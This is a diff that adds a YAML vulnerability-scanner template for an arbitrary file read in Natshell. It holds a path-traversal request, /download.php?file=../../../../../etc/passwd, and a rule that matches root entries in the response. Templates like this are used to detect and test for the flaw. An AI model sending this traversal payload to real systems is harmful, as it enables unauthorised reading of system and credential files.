@@ -1,0 +1,12 @@
+expression: r0()
+id: natshell-arbitrary-file-read
+info:
+  author: Print1n(http://print1n.top)
+  name: Natshell Arbitrary File Read
+  severity: high
+rules:
+  r0:
+    expression: response.status == 200 && "(root|toor):[x*]:0:0:".bmatches(response.body)
+    request:
+      method: GET
+      path: /download.php?file=../../../../../etc/passwd
